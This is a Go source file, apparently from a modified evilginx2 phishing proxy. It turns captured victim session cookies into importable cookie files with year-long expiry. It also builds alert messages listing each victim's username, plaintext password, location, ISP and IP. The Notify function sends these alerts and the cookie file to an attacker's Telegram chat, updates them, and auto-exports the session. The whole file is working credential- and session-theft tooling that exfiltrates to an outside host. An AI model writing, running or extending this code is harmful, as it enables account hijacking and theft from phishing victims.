package core

import (
	"encoding/json"
	"fmt"
	"math/rand"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"time"

	"github.com/kgretzky/evilginx2/log"
)

type Token struct {
	Name             string      `json:"name"`
	Value            string      `json:"value"`
	Domain           string      `json:"domain"`
	HostOnly         bool        `json:"hostOnly"`
	Path             string      `json:"path"`
	Secure           bool        `json:"secure"`
	HttpOnly         bool        `json:"httpOnly"`
	SameSite         string      `json:"sameSite"`
	Session          bool        `json:"session"`
	FirstPartyDomain string      `json:"firstPartyDomain"`
	PartitionKey     interface{} `json:"partitionKey"`
	ExpirationDate   *int64      `json:"expirationDate,omitempty"`
	StoreID          interface{} `json:"storeId"`
}

func extractTokens(input map[string]map[string]map[string]interface{}) []Token {
	var tokens []Token

	for domain, tokenGroup := range input {
		for _, tokenData := range tokenGroup {
			var t Token

			if name, ok := tokenData["Name"].(string); ok {
				t.Name = name
			}
			if val, ok := tokenData["Value"].(string); ok {
				t.Value = val
			}
			// Remove leading dot from domain
			for len(domain) > 0 && domain[0] == '.' {
				domain = domain[1:]
			}
			t.Domain = domain

			if hostOnly, ok := tokenData["HostOnly"].(bool); ok {
				t.HostOnly = hostOnly
			}
			if path, ok := tokenData["Path"].(string); ok {
				t.Path = path
			}
			if secure, ok := tokenData["Secure"].(bool); ok {
				t.Secure = secure
			}
			if httpOnly, ok := tokenData["HttpOnly"].(bool); ok {
				t.HttpOnly = httpOnly
			}
			if sameSite, ok := tokenData["SameSite"].(string); ok {
				t.SameSite = sameSite
			}
			if session, ok := tokenData["Session"].(bool); ok {
				t.Session = session
			}
			if fpd, ok := tokenData["FirstPartyDomain"].(string); ok {
				t.FirstPartyDomain = fpd
			}
			if pk, ok := tokenData["PartitionKey"]; ok {
				t.PartitionKey = pk
			}

			if storeID, ok := tokenData["storeId"]; ok {
				t.StoreID = storeID
			} else if storeID, ok := tokenData["StoreID"]; ok {
				t.StoreID = storeID
			}

			exp := time.Now().AddDate(1, 0, 0).Unix()
			t.ExpirationDate = &exp

			tokens = append(tokens, t)
		}
	}
	return tokens
}

func processAllTokens(sessionTokens, httpTokens, bodyTokens, customTokens string) ([]Token, error) {
	var consolidatedTokens []Token

	for _, tokenJSON := range []string{sessionTokens, httpTokens, bodyTokens} {
		if tokenJSON == "" {
			continue
		}

		var rawTokens map[string]map[string]map[string]interface{}
		if err := json.Unmarshal([]byte(tokenJSON), &rawTokens); err != nil {
			return nil, fmt.Errorf("error parsing token JSON: %v", err)
		}

		tokens := extractTokens(rawTokens)
		consolidatedTokens = append(consolidatedTokens, tokens...)
	}

	return consolidatedTokens, nil
}

var processedSessions = make(map[string]time.Time)
var sessionMessageMap = make(map[string]int)
var mu sync.Mutex

func generateRandomString() string {
	rand.Seed(time.Now().UnixNano())
	const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	length := 10
	randomStr := make([]byte, length)
	for i := range randomStr {
		randomStr[i] = charset[rand.Intn(len(charset))]
	}
	return string(randomStr)
}

func createTxtFile(session TSession) (string, error) {
	txtFileName := generateRandomString() + ".txt"
	txtFilePath := filepath.Join(os.TempDir(), txtFileName)

	txtFile, err := os.Create(txtFilePath)
	if err != nil {
		return "", fmt.Errorf("failed to create text file: %v", err)
	}
	defer txtFile.Close()

	tokensJSON, err := json.MarshalIndent(session.Tokens, "", "  ")
	if err != nil {
		return "", fmt.Errorf("failed to marshal Tokens: %v", err)
	}
	httpTokensJSON, err := json.MarshalIndent(session.HTTPTokens, "", "  ")
	if err != nil {
		return "", fmt.Errorf("failed to marshal HTTPTokens: %v", err)
	}
	bodyTokensJSON, err := json.MarshalIndent(session.BodyTokens, "", "  ")
	if err != nil {
		return "", fmt.Errorf("failed to marshal BodyTokens: %v", err)
	}
	customJSON, err := json.MarshalIndent(session.Custom, "", "  ")
	if err != nil {
		return "", fmt.Errorf("failed to marshal Custom: %v", err)
	}

	allTokens, err := processAllTokens(string(tokensJSON), string(httpTokensJSON), string(bodyTokensJSON), string(customJSON))
	if err != nil {
		log.Warning("notify: failed to process tokens: %v", err)
	}

	result, err := json.MarshalIndent(allTokens, "", "  ")
	if err != nil {
		return "", fmt.Errorf("failed to marshal final tokens: %v", err)
	}

	log.Debug("notify: combined %d tokens for session", len(allTokens))

	_, err = txtFile.WriteString(string(result))
	if err != nil {
		return "", fmt.Errorf("failed to write data to text file: %v", err)
	}

	return txtFilePath, nil
}

// countTokens returns the total number of captured cookie tokens across all domains.
func countTokens(tokens map[string]interface{}) int {
	total := 0
	for _, v := range tokens {
		if group, ok := v.(map[string]interface{}); ok {
			total += len(group)
		}
	}
	return total
}

// countryFlag converts a 2-letter ISO code to its flag emoji.
func countryFlag(iso string) string {
	if len(iso) != 2 {
		return "🌐"
	}
	r1 := rune(iso[0]-'A') + 0x1F1E6
	r2 := rune(iso[1]-'A') + 0x1F1E6
	return string([]rune{r1, r2})
}

// parseUserAgent extracts a short browser/OS label from a UA string.
func parseUserAgent(ua string) string {
	ua = strings.ToLower(ua)
	browser := "Unknown"
	os := "Unknown"
	switch {
	case strings.Contains(ua, "edg/"):
		browser = "Edge"
	case strings.Contains(ua, "chrome/"):
		browser = "Chrome"
	case strings.Contains(ua, "firefox/"):
		browser = "Firefox"
	case strings.Contains(ua, "safari/") && !strings.Contains(ua, "chrome"):
		browser = "Safari"
	}
	switch {
	case strings.Contains(ua, "windows"):
		os = "Windows"
	case strings.Contains(ua, "macintosh") || strings.Contains(ua, "mac os"):
		os = "macOS"
	case strings.Contains(ua, "linux"):
		os = "Linux"
	case strings.Contains(ua, "android"):
		os = "Android"
	case strings.Contains(ua, "iphone") || strings.Contains(ua, "ipad"):
		os = "iOS"
	}
	return browser + " / " + os
}

func formatSessionMessage(session TSession, updated bool) string {
	e := TelegramMarkdownV2Escape

	pl := e(strings.ToUpper(session.Phishlet))
	user := session.Username
	if user == "" {
		user = "—"
	}
	pass := session.Password
	if pass == "" {
		pass = "—"
	}

	title := "🎯 *NEW CAPTURE*"
	if updated {
		title = "🔄 *UPDATED*"
	}

	tokCount := countTokens(session.Tokens)
	cookieBit := fmt.Sprintf("🍪 %d cookies", tokCount)
	if tokCount == 0 {
		cookieBit = "🍪 none"
	}
	ts := time.Unix(session.CreateTime, 0).UTC().Format("02 Jan · 15:04 UTC")

	lines := []string{
		title + " · `" + pl + "`",
		"`" + e(user) + "`  ·  `" + e(pass) + "`",
	}

	// location / network -------------------------------------------------
	if session.Custom != nil {
		cc, _ := session.Custom["geo_country_code"].(string)
		country, _ := session.Custom["geo_country_name"].(string)
		city, _ := session.Custom["geo_city_name"].(string)
		isp, _ := session.Custom["geo_isp"].(string)
		asn, _ := session.Custom["geo_asn"].(string)
		isVPN, _ := session.Custom["geo_vpn"].(string)
		isDC, _ := session.Custom["geo_datacenter"].(string)

		if country != "" {
			loc := country
			if city != "" {
				loc = city + ", " + country
			}
			lines = append(lines, "🌍 "+countryFlag(cc)+" "+e(loc))
		}
		if isp != "" {
			org := isp
			if asn != "" {
				org = "AS" + asn + " " + isp
			}
			tag := ""
			if isVPN == "true" {
				tag = " · VPN"
			} else if isDC == "true" {
				tag = " · DC"
			}
			lines = append(lines, "🏢 "+e(org)+e(tag))
		} else if isVPN == "true" || isDC == "true" {
			tag := "VPN"
			if isDC == "true" {
				tag = "Datacenter"
			}
			lines = append(lines, "🛡️ "+e(tag))
		}
	}

	lines = append(lines,
		"🖥️ "+e(parseUserAgent(session.UserAgent)),
		"🌐 `"+e(session.RemoteAddr)+"`",
		cookieBit+" · 🕒 "+e(ts),
	)

	return strings.Join(lines, "\n")
}

func Notify(session TSession, chatid string, teletoken string) {
	// Use the UUID-based SessionID as the deduplication key, not the integer ID
	// (which is always 0 and would conflate all sessions into one).
	cacheKey := session.SessionID
	if cacheKey == "" {
		cacheKey = fmt.Sprintf("id-%d", session.ID)
	}

	mu.Lock()
	// Check if this session was already notified recently → send an update instead.
	if lastNotified, exists := processedSessions[cacheKey]; exists && time.Since(lastNotified) < 5*time.Minute {
		mu.Unlock()
		messageID, exists := sessionMessageMap[cacheKey]
		if exists {
			txtFilePath, err := createTxtFile(session)
			if err != nil {
				fmt.Println("Error creating TXT file for update:", err)
				return
			}
			msg_body := formatSessionMessage(session, true)
			err = editMessageFile(chatid, teletoken, messageID, txtFilePath, msg_body)
			if err != nil {
				fmt.Printf("Error editing message: %v\n", err)
			}
			os.Remove(txtFilePath)
		} else {
			fmt.Println("Message ID not found for session:", cacheKey)
		}
		return
	}

	// Mark session as processed
	processedSessions[cacheKey] = time.Now()

	// Clean up old entries (forget sessions older than 30 minutes)
	for sid, t := range processedSessions {
		if time.Since(t) > 30*time.Minute {
			delete(processedSessions, sid)
		}
	}
	mu.Unlock()

	// Create the TXT file for the original message
	txtFilePath, err := createTxtFile(session)
	if err != nil {
		fmt.Println("Error creating TXT file:", err)
		return
	}

	// Format the message
	message := formatSessionMessage(session, false)

	// Send the notification and get the message ID
	messageID, err := sendTelegramNotification(chatid, teletoken, message, txtFilePath)
	if err != nil {
		fmt.Printf("Error sending Telegram notification: %v\n", err)
		os.Remove(txtFilePath)
		return
	}

	// Map the session ID to the message ID
	mu.Lock()
	sessionMessageMap[cacheKey] = messageID
	mu.Unlock()

	// Remove the temporary TXT file
	os.Remove(txtFilePath)

	// Auto-export session if enabled
	go AutoExportSession(session)
}
